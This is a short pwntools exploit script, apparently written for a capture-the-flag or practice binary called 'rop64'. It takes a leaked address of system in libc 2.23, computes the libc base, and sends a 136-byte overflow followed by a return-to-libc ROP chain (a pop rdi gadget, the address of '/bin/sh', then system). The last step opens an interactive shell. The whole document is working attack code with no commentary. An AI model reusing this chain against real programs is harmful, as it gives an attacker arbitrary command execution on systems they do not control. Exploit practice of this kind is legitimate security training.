from pwn import *

io = process('./rop64')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

system_addr = int(io.recvline(), 16)
libc_addr = system_addr - libc.sym['system']
binsh_addr = libc_addr + next(libc.search('/bin/sh'))
pop_rdi_addr = libc_addr + 0x0000000000021102

payload = "A"*136 + p64(pop_rdi_addr) + p64(binsh_addr) + p64(system_addr)

io.send(payload)
io.interactive()
